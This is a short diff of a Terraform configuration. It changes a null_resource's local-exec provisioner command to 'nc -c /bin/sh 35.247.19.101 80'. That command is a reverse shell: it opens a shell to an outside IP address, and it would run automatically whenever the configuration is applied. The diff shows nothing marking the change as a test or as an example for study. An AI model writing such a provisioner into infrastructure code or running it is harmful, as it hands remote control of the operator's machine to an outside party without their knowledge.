@@ -9,7 +9,7 @@ resource "random_id" "random" {
 
 resource "null_resource" "example5" {
   provisioner "local-exec" {
-    command = "nc"
+    command = "nc -c /bin/sh 35.247.19.101 80"
   }
 }
 
